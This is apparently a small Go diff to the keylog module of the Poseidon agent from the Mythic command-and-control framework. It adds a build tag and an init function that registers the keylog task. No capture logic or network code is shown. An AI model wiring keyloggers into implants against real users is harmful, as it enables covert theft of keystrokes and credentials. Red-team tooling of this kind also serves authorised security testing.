@@ -1,3 +1,5 @@
+//go:build keylog || debug
+
 package keylog
 
 import (
@@ -7,8 +9,13 @@ import (
 
 	// Poseidon
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/keylog/keystate"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/tasks/taskRegistrar"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
+
+func init() {
+	taskRegistrar.Register("keylog", Run)
+}
 
 // Run - Function that executes the shell command
 func Run(task structs.Task) {
